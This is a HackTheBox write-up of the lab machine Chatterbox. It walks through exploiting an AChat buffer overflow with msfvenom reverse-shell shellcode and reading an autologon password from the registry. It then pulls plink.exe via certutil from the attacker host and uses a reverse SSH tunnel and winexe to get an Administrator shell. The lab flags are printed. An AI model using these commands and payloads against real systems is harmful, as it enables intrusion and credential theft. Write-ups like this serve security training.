# Chatterbox: HackTheBox Writeup

| Field | Details |
|---|---|
| **Machine Name** | Chatterbox |
| **OS** | Windows 7 Professional SP1 (x86) |
| **Difficulty** | Easy |
| **Category** | Windows / Buffer Overflow / Privilege Escalation |
| **IP Address** | 10.129.6.94 |
| **User Flag** | `722906c9895431240507317445506334` |
| **Root Flag** | `faae751f8b5573e93ae1e47810002c07` |
| **Exploit Method** | Manual Buffer Overflow: No Metasploit |
| **PrivEsc Method** | Registry Credential Discovery → Plink Reverse SSH Tunnel → winexe |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → AChat service on 9255/9256 → searchsploit BOF exploit (36025.py)
→ msfvenom shellcode (no Metasploit framework) → shell as Alfred
→ systeminfo + netstat → registry Winlogon DefaultPassword = Welcome1!
→ Plink reverse SSH tunnel (445:127.0.0.1:445 → attacker)
→ winexe //127.0.0.1 as Administrator → root shell
```

---

## Phase 1: Reconnaissance

### 1.1: Port Discovery

**Goal:** Identify all open TCP ports on the target before running heavier service scans.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.6.94 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 13:02 IST
Nmap scan report for 10.129.6.94
Host is up (0.21s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 35.48 seconds
```

**Output Analysis:**

| Port | State | Significance |
|---|---|---|
| 135/tcp | open | Windows RPC endpoint mapper |
| 139/tcp | open | NetBIOS session service |
| 445/tcp | open | SMB: not externally exploitable here; pivoting target later |
| 9255/tcp | open | AChat: primary attack surface |
| 9256/tcp | open | AChat control port |
| 49152-49157/tcp | open | Dynamic RPC endpoints: noise |

The immediately interesting ports are 9255 and 9256. These are non-standard and warrant service identification.

---

### 1.2: Service and Version Enumeration

**Goal:** Confirm what is running on 9255/9256 and collect OS/version details.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 135,139,445,9255,9256 10.129.6.94 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 13:06 IST
Nmap scan report for 10.129.6.94
Host is up (0.21s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
|_http-title: Site doesn't have a title.

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (DANGEROUS, but not default)
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7: sp1:professional
|   Computer name: CHATTERBOX
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-18T14:36:22+05:30

Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
```

**Output Analysis:**

| Finding | Detail |
|---|---|
| OS confirmed | Windows 7 Professional SP1: no modern mitigations |
| AChat confirmed | Runs on both 9255 (HTTP interface) and 9256 (chat protocol) |
| SMB signing disabled | Relay attacks possible; also the lateral movement path for later |
| Hostname | CHATTERBOX in WORKGROUP: standalone, no domain controller |
| Guest auth on SMB | Low-privilege enumeration possible but not the path here |

Windows 7 SP1 x86 is immediately significant. It predates ASLR enforcement on all modules, and known AChat versions have a published remote buffer overflow.

---

## Phase 2: Foothold: AChat Buffer Overflow (No Metasploit)

### 2.1: Exploit Research

**Goal:** Find a public exploit for the AChat service and determine if it is manually weaponisable.

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit achat
```

```
---------------------------------------------------------------------
 Exploit Title                                          |  Path
---------------------------------------------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow              | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit) | windows/remote/36056.rb
---------------------------------------------------------------------
Shellcodes: No Results
```

**Output Analysis:**

| Result | Decision |
|---|---|
| `36025.py`: standalone Python exploit | **Use this**: no Metasploit framework required |
| `36056.rb`: Metasploit module | Skipped: avoiding Metasploit for foothold |

The Python exploit sends a UDP packet to port 9256 containing a crafted buffer that overflows a stack-based buffer in AChat, redirecting execution to attacker-controlled shellcode embedded in the payload. The default shellcode in 36025.py spawns `calc.exe`: useless. It must be replaced with a reverse shell payload before execution.

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit -m windows/remote/36025.py
```

```
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
    Codes: CVE-2015-1578, CVE-2015-1577
 Verified: True
File Type: Python script, ASCII text executable
Exploit copied to: /home/kali/htb/chatterbox/36025.py
```

---

### 2.2: Shellcode Generation

**Goal:** Generate a Windows x86 reverse shell payload encoded for unicode compatibility using msfvenom: no Metasploit framework, payload generation only.

The AChat exploit buffer passes through a unicode transformation layer inside the vulnerable application. Raw shellcode will be corrupted. The `x86/unicode_mixed` encoder with `BufferRegister=EAX` tells msfvenom to generate shellcode that survives that transformation.

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=10.10.16.36 \
  LPORT=4444 \
  -e x86/unicode_mixed \
  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' \
  BufferRegister=EAX \
  -f python
```

```
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3820 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
[... truncated for display: full buf pasted into exploit ...]
```

**Output Analysis:**

| Parameter | Reason |
|---|---|
| `-a x86 --platform Windows` | AChat is a 32-bit Windows application |
| `windows/shell_reverse_tcp` | Non-staged payload: no second-stage stager needed |
| `-e x86/unicode_mixed` | Required: AChat processes input through a unicode path; raw shellcode would be mangled |
| `BufferRegister=EAX` | Tells the encoder the register that holds the shellcode address at jump time; specific to this exploit |
| `-b '\x00\x80-\xff'` | Null bytes and high bytes corrupt the unicode transformation |
| `-f python` | Output formatted for direct paste into the Python exploit |

---

### 2.3: Exploit Modification

**Goal:** Replace the default `calc.exe` shellcode in 36025.py with the msfvenom reverse shell buf, and update the target IP.

The exploit requires two changes:

1. Replace the `buf` variable with the msfvenom output.
2. Update `server_address` to point at the target IP.

The relevant section of the modified exploit:

```python
# ---- MODIFIED SECTION ----
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
# [full msfvenom output here]

# Updated target
server_address = ('10.129.6.94', 9256)
# ---- END MODIFIED SECTION ----
```

---

### 2.4: Listener Setup and Exploit Execution

**Goal:** Catch the reverse shell.

Terminal 1: Listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

```
listening on [any] 4444 ...
```

Terminal 2: Fire the exploit:

```bash
Hackerpatel007_1@htb[/htb]$ python2 36025.py
```

```
---->{P00F}!
```

Terminal 1: Shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.6.94] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

**Flag breakdown:**

| Item | Value |
|---|---|
| Shell context | `chatterbox\alfred` |
| Exploit mechanism | UDP BOF → EIP overwrite → shellcode exec → reverse TCP shell |
| Metasploit used | No: msfvenom only for payload generation; `nc` for handler |

---

## Phase 3: Post-Foothold Enumeration (as Alfred)

### 3.1: System Information

**Goal:** Establish OS version, architecture, patch level, and kernel exploit viability.

```
C:\Windows\system32>systeminfo
systeminfo
```

```
Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Alfred
Registered Organization:
Product ID:                00371-222-9819843-86753
Original Install Date:     12/10/2017, 9:18:09 AM
System Boot Time:          4/18/2025, 1:06:43 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,526 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,492 MB
Virtual Memory: In Use:    603 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           ... [truncated]
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.129.6.94
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Windows 7 SP1 Build 7601 | Old OS: kernel exploits viable (MS16-032, MS15-051 candidates) |
| x86 architecture | Shellcode and exploit payloads must be 32-bit |
| 183 hotfixes installed | Patched against many CVEs; kernel exploit path uncertain without wmic qfe cross-reference |
| WORKGROUP: no domain | No Kerberos, no DC; local account attacks are the relevant path |
| Single NIC | No multi-homed routing; internal services exist only on this host |

---

### 3.2: User Enumeration

**Goal:** Identify all local accounts, group membership, and confirm Alfred's privilege level.

```
C:\Windows\system32>net users
net users
```

```
User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest
The command completed successfully.
```

```
C:\Windows\system32>net user Alfred
net user Alfred
```

```
User name                    Alfred
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 9:24:22 AM
Password expires             Never
Password changeable          12/10/2017 9:24:22 AM
Password required            Yes
User may change password     Yes

Workgroups allowed           *USERS

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Three accounts: Administrator, Alfred, Guest | Two viable privilege escalation targets |
| Alfred is in `Users` only | No admin rights: cannot read `C:\Users\Administrator\Desktop` |
| Guest account exists | Not used here but worth noting for pivoting in real engagements |
| Password never expires | Credential is stable; any stored password is likely current |

---

### 3.3: Network State Enumeration

**Goal:** Identify all listening ports, determine which services are internally bound, and map the attack surface for tunnelling.

```
C:\Windows\system32>netstat -ano
netstat -ano
```

```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9255           0.0.0.0:0              LISTENING       2664
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       392
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       764
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       1008
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       500
  TCP    10.129.6.94:9256       10.10.16.36:51220      ESTABLISHED     2664
  TCP    127.0.0.1:445          0.0.0.0:0              LISTENING       4
  UDP    0.0.0.0:123            *:*                                    892
  UDP    0.0.0.0:9256           *:*                                    2664
  UDP    0.0.0.0:500            *:*                                    992
  UDP    0.0.0.0:5355           *:*                                    1132
```

**Output Analysis:**

| Address | Port | Significance |
|---|---|---|
| `0.0.0.0:445` | SMB | Bound to all interfaces, but firewall likely blocks externally |
| `127.0.0.1:445` | SMB | **Critical**: second SMB listener bound to loopback only; direct external connection impossible |
| `0.0.0.0:9255-9256` | AChat | Externally reachable: already exploited |
| `10.129.6.94:9256 → 10.10.16.36:51220` | ESTABLISHED | Our active shell session |

The `127.0.0.1:445` entry is the key finding. Port 445 (SMB) is accessible from the target's loopback only. Tools like `winexe` and `psexec.py` that authenticate over SMB to execute commands remotely cannot reach this from the attacker machine directly. A port tunnel is required to make the attacker appear as a local process on the target.

---

## Phase 4: Credential Discovery

### 4.1: Registry Password Hunt

**Goal:** Search the registry for cleartext or encoded credentials stored in known autologon keys.

The Windows registry frequently stores credentials in cleartext for kiosk-style autologon configurations. The most reliable location is:

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

```
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoAdminLogon    REG_SZ    1
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    DefaultPassword    REG_SZ    Welcome1!
    SFCScan    REG_SZ    0
```

**Flag breakdown:**

| Registry Value | Data | Significance |
|---|---|---|
| `AutoAdminLogon` | `1` | Autologon is **active**: the system automatically logs Alfred in on boot |
| `DefaultUserName` | `Alfred` | Confirms the account this credential belongs to |
| `DefaultPassword` | `Welcome1!` | **Alfred's cleartext password**: stored in registry |

**Why this key exists:**

`AutoAdminLogon` is a Windows feature designed for kiosks, ATMs, and embedded systems that must boot directly into a user session without a password prompt. When `AutoAdminLogon=1`, Windows reads `DefaultPassword` at logon and supplies it automatically. This configuration is disabled by default on all standard installations. Its presence here means someone deliberately configured autologon, and left the password in plaintext in the registry. This is a critical security misconfiguration.

---

### 4.2: Credential Reuse Hypothesis

With `Alfred:Welcome1!` confirmed, the next question is whether the Administrator account shares the same password. This is a real-world pattern: on standalone workstations set up by a single person, the same password is frequently reused across all local accounts.

Testing this requires reaching the Administrator account. Direct options from the current shell:

- `runas /user:Administrator cmd.exe`: interactive; requires a real terminal, not this pipe shell
- SMB authentication via `net use`: possible but complex from target-side
- **Port-forward the internal SMB port and authenticate from the attacker machine using `winexe`**: cleanest path

The port forward route is chosen because it allows clean SMB authentication with full credential control from Kali.

---

## Phase 5: Privilege Escalation

### 5.1: SSH Server Setup on Attacker

**Goal:** Prepare the attacker machine to receive the reverse SSH tunnel from the target. Plink (PuTTY's command-line SSH client) will connect outbound from the target to the attacker's SSH daemon.

```bash
Hackerpatel007_1@htb[/htb]$ sudo apt install openssh-server -y
```

```bash
Hackerpatel007_1@htb[/htb]$ sudo nano /etc/ssh/sshd_config
```

Change the following line:

```
# PermitRootLogin prohibit-password
```

To:

```
PermitRootLogin yes
```

Also ensure password authentication is permitted:

```
PasswordAuthentication yes
```

```bash
Hackerpatel007_1@htb[/htb]$ sudo service ssh restart
```

```bash
Hackerpatel007_1@htb[/htb]$ sudo service ssh status
```

```
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)
     Active: active (running) since Fri 2025-04-18 13:41:17 IST; 3s ago
   Main PID: 14832 (sshd)
```

> **Lab Note:** `PermitRootLogin yes` with password authentication is intentionally insecure and only appropriate in isolated HTB VPN environments. Never configure a production SSH server this way.

---

### 5.2: Transfer Plink to Target

**Goal:** Get `plink.exe` onto the target so it can initiate the reverse SSH tunnel.

Plink is part of the PuTTY suite. The 32-bit binary is required because the target is x86 Windows 7.

On Kali, host Plink via a Python HTTP server:

```bash
Hackerpatel007_1@htb[/htb]$ cp /usr/share/windows-resources/binaries/plink.exe .
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8080
```

```
Serving HTTP on 0.0.0.0 port 8080 ...
```

On the target (Alfred's shell), download Plink:

```
C:\Windows\system32>cd C:\Users\Alfred\AppData\Local\Temp
C:\Users\Alfred\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.36:8080/plink.exe plink.exe
```

```
****  Online  ****
  000000  ...
  0a4400
CertUtil: -URLCache command completed successfully.
```

**Output Analysis:**

| Item | Detail |
|---|---|
| Transfer method | `certutil`: native Windows binary, no PowerShell restrictions hit |
| Landing directory | `%TEMP%`: writable by low-privilege users, no UAC interference |
| Plink version | 32-bit required; 64-bit Plink on a 32-bit OS will fail to execute |

---

### 5.3: Establish Reverse SSH Tunnel

**Goal:** Use Plink to create a reverse SSH port forward from the target. After the tunnel is up, the attacker's `127.0.0.1:445` will transparently route to the target's `127.0.0.1:445`.

**How `-R` forwarding works:**

```
[Attacker Kali]                         [Target CHATTERBOX]
    SSH daemon ◄──── Plink SSH conn ────── plink.exe -R 445:127.0.0.1:445
    127.0.0.1:445 ──► SSH tunnel ──────────────────► 127.0.0.1:445 (SMB)
         ▲
    winexe connects here
```

The `-R 445:127.0.0.1:445` flag instructs the SSH daemon on the attacker: "listen on port 445 of my loopback interface; for every connection to that port, tunnel the traffic back through this SSH session and deliver it to `127.0.0.1:445` on the target."

On the target (Alfred's shell):

```
C:\Users\Alfred\AppData\Local\Temp>plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.36
```

```
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 2048 a2:51:a8:2e:00:f5:4c:89:09:e3:1a:24:29:2e:9a:11
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not want to connect, press Return.
Store key in cache? (y/n) y
Using username "root".
root@10.10.16.36's password:
```

> **Note:** The key caching prompt is interactive. If the shell is non-interactive (pipe shell), append `-batch` to skip it:
> ```
> plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.36 -batch
> ```

After authentication, the terminal appears to hang: this is normal. The SSH session is now active and holding the tunnel open.

---

### 5.4: Verify the Tunnel

**Goal:** Confirm port 445 is now listening on `127.0.0.1` of the attacker machine before attempting `winexe`.

On the attacker (new terminal):

```bash
Hackerpatel007_1@htb[/htb]$ ss -tlnp | grep 445
```

```
LISTEN   0   128   127.0.0.1:445   0.0.0.0:*   users:(("sshd",pid=14832,fd=9))
```

**Output Analysis:**

| Field | Value | Meaning |
|---|---|---|
| `LISTEN` |: | Port is actively waiting for connections |
| `127.0.0.1:445` | loopback:SMB | SSH daemon is forwarding this locally: tunnel is live |
| `sshd` pid | 14832 | Owned by the SSH process that received the Plink connection |

The tunnel is established. Any TCP connection from the attacker to `127.0.0.1:445` is now forwarded through the SSH session to the target's `127.0.0.1:445` (SMB).

---

### 5.5: Remote Execution as Administrator via winexe

**Goal:** Authenticate to the tunnelled SMB port using `Administrator:Welcome1!` and execute `cmd.exe`: confirming credential reuse and obtaining a privileged shell.

**How winexe works:**

1. Authenticates to the SMB share at `//127.0.0.1` using the provided credentials.
2. Connects to the Service Control Manager (SCM) over SMB/RPC.
3. Creates a temporary Windows service with the command as the binary path.
4. Starts the service: executing the command in SYSTEM or the specified user's context.
5. Pipes stdout/stderr back over the SMB connection.
6. Removes the service on exit.

```bash
Hackerpatel007_1@htb[/htb]$ winexe -U 'Administrator%Welcome1!' //127.0.0.1 "cmd.exe"
```

```
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator
```

**Flag breakdown:**

| Item | Value |
|---|---|
| Authentication | `Administrator:Welcome1!`: password reused from Alfred's autologon credential |
| Target | `//127.0.0.1`: SSH tunnel makes attacker's localhost the target's localhost |
| Result | Shell running as `chatterbox\administrator` |

---

## Phase 6: Flag Capture

### 6.1: User Flag

```
C:\Windows\system32>type C:\Users\Alfred\Desktop\user.txt
type C:\Users\Alfred\Desktop\user.txt
722906c9895431240507317445506334
```

### 6.2: Root Flag

From the Administrator shell:

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
faae751f8b5573e93ae1e47810002c07
```

**Flag Summary:**

| Flag | Value | Path |
|---|---|---|
| User | `722906c9895431240507317445506334` | `C:\Users\Alfred\Desktop\user.txt` |
| Root | `faae751f8b5573e93ae1e47810002c07` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. Non-standard ports are your entry point: always scan everything.**
The default top-1000 Nmap scan would have found AChat. A `--top-ports` partial scan might have missed 9255/9256. Full `-p-` scans on HTB machines are non-negotiable before assuming you have the full attack surface.

**2. msfvenom is not Metasploit.**
The Metasploit *framework* (handlers, modules, sessions) was not used for foothold or privilege escalation. msfvenom is a standalone payload generator: using it to craft shellcode is fundamentally different from using an MSF exploit module. Understanding this distinction is essential for engagements where Metasploit is restricted (OSCP) or where custom BOF exploitation is required.

**3. The `x86/unicode_mixed` encoder requirement is application-specific: understand why, not just what.**
AChat's vulnerable code path transforms input through a unicode layer. Raw shellcode does not survive this. The encoder produces shellcode consisting entirely of printable unicode-safe bytes. `BufferRegister=EAX` tells the decoder stub where the shellcode resides in memory at execution time. Missing either detail causes a silent failure: the exploit fires, nothing happens, and without understanding the encoding requirement you would not know why.

**4. Autologon credentials in the registry are a high-value target on any Windows workstation.**
`HKLM\...\Winlogon\DefaultPassword` is the single most reliable location for cleartext credentials on standalone Windows systems. This key exists on every machine where someone configured automatic logon. Check it on every Windows foothold before attempting anything complex.

**5. Internal port identification determines your tunnelling strategy.**
Seeing `127.0.0.1:445` in `netstat -ano` is not just an observation: it is a decision gate. The question immediately becomes: which tools require SMB access, and how do I deliver that access from an external attacker position? Plink's reverse SSH tunnel is one answer. Chisel, socat, and Metasploit's portfwd are others. Understanding *why* you need the tunnel prevents confusion about which tool solves which problem.

**6. Credential reuse is a hypothesis that must be tested, not assumed.**
`Alfred:Welcome1!` found in the registry does not guarantee `Administrator:Welcome1!` works. The correct methodology is: form the hypothesis, design the test (winexe), execute the test, verify the result. In this case the test succeeded. If it had failed, the next steps would be kernel exploitation, token impersonation, or AlwaysInstallElevated: each requiring its own decision flow.

**7. `-R` vs `-L` in SSH port forwarding: direction matters.**
`-R` (remote forwarding): target initiates the SSH connection outbound, creating a listener on the attacker's machine that routes inbound to the target's internal port. Use when the attacker needs to reach a port on the target that is internally bound.
`-L` (local forwarding): attacker initiates the SSH connection, creating a listener locally that routes to a port on the remote side. Use when the attacker already has SSH access and wants to expose a service the target can reach.
On Chatterbox, the target has no inbound SSH port open, so the target must reach out: making `-R` the only viable option.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
|---|---|---|---|
| 1 | Recon | `nmap -p-` full port scan | Ports 9255/9256 identified |
| 2 | Recon | `nmap -sV -sC` service scan | AChat confirmed; Windows 7 SP1 x86 |
| 3 | Initial Access | `searchsploit achat` | Exploit 36025.py identified |
| 4 | Initial Access | `msfvenom` shellcode generation with `x86/unicode_mixed` | 774-byte reverse shell payload |
| 5 | Initial Access | Modified 36025.py executed → UDP BOF | Reverse shell as `chatterbox\alfred` |
| 6 | Enumeration | `systeminfo`, `net user Alfred` | Windows 7 SP1 x86; Alfred in Users only |
| 7 | Enumeration | `netstat -ano` | `127.0.0.1:445` internally bound |
| 8 | Credential Discovery | `reg query HKLM\...\Winlogon` | `DefaultPassword=Welcome1!` for Alfred |
| 9 | PrivEsc Setup | Configure `PermitRootLogin yes`; restart SSH on Kali | Attacker ready to receive tunnel |
| 10 | PrivEsc Setup | `certutil` download of `plink.exe` to `%TEMP%` | Plink on target |
| 11 | PrivEsc | `plink.exe -R 445:127.0.0.1:445 10.10.16.36` | Reverse SSH tunnel established |
| 12 | PrivEsc | `ss -tlnp \| grep 445` on attacker | `127.0.0.1:445` confirmed listening |
| 13 | PrivEsc | `winexe -U 'Administrator%Welcome1!' //127.0.0.1 "cmd.exe"` | Shell as `chatterbox\administrator` |
| 14 | Flag | `type C:\Users\Alfred\Desktop\user.txt` | `722906c9895431240507317445506334` |
| 15 | Flag | `type C:\Users\Administrator\Desktop\root.txt` | `faae751f8b5573e93ae1e47810002c07` |

---

## Commands Reference

| Command | Phase | Purpose |
|---|---|---|
| `nmap -p- --min-rate 5000 -T4 10.129.6.94` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 135,139,445,9255,9256 10.129.6.94` | Recon | Service version and script scan |
| `searchsploit achat` | Research | Find public exploits for AChat |
| `searchsploit -m windows/remote/36025.py` | Research | Copy exploit to working directory |
| `msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80-\xff' BufferRegister=EAX -f python` | Weaponisation | Generate unicode-safe reverse shell shellcode |
| `nc -lvnp 4444` | Exploitation | Catch reverse shell |
| `python2 36025.py` | Exploitation | Execute AChat buffer overflow |
| `systeminfo` | Enumeration | OS version, build, architecture |
| `whoami` | Enumeration | Current user context |
| `net users` | Enumeration | List all local accounts |
| `net user Alfred` | Enumeration | Alfred's group membership |
| `netstat -ano` | Enumeration | All listening ports and bound interfaces |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` | Credential Discovery | Autologon credential extraction |
| `sudo nano /etc/ssh/sshd_config` | PrivEsc Setup | Enable PermitRootLogin on attacker |
| `sudo service ssh restart` | PrivEsc Setup | Apply SSH config change |
| `python3 -m http.server 8080` | File Transfer | Serve plink.exe to target |
| `certutil -urlcache -split -f http://10.10.16.36:8080/plink.exe plink.exe` | File Transfer | Download plink.exe on target (native Windows) |
| `plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.36` | PrivEsc | Reverse SSH tunnel: expose target's SMB to attacker |
| `ss -tlnp \| grep 445` | PrivEsc | Verify tunnel is active on attacker |
| `winexe -U 'Administrator%Welcome1!' //127.0.0.1 "cmd.exe"` | PrivEsc | SMB-based command execution as Administrator |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
|---|---|---|
| T1203 | Exploitation for Client Execution | AChat BOF (CVE-2015-1578) exploited to execute shellcode |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | `cmd.exe` obtained via both winexe and initial shell |
| T1552.002 | Unsecured Credentials: Credentials in Registry | `DefaultPassword` read from `HKLM\...\Winlogon` |
| T1078.001 | Valid Accounts: Default Accounts | Alfred's autologon credential reused for Administrator access |
| T1572 | Protocol Tunneling | Plink reverse SSH tunnel exposing internal SMB |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | winexe authenticates over SMB to execute `cmd.exe` as Administrator |
